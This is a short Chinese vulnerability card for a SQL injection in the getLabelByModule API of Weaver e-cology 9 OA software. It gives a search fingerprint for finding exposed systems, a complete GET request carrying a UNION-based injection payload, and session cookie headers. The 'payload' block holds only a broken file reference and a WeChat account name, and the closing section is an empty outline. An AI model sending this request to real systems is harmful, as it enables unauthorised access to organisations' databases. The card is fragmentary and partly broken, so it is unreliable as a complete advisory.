# 泛微e-cology9getLabelByModule存在SQL注入漏洞

- **系统**：泛微OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name=="泛微 e-cology 9.0 OA"`
- **请求**：`GET /api/ec/dev/locale/getLabelByModule?moduleCode=aaa%27)+union+all+select+%271,1123123%27+-- HTTP/1.1`
- **关键头**：`Cookie: ecology_JSessionid=aaafq1VgScyAG__D1rFYy; __randcode__=00573071-bf7f-41e3-9e60-4…`

**请求体 / payload**
```
\[weaver-getLabelByModule-SQL.yaml]\(公众号：渗透安全HackTwo
```

**其他**
- 泛微e-cology 9 getLabelByModule存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 泛微e-cology9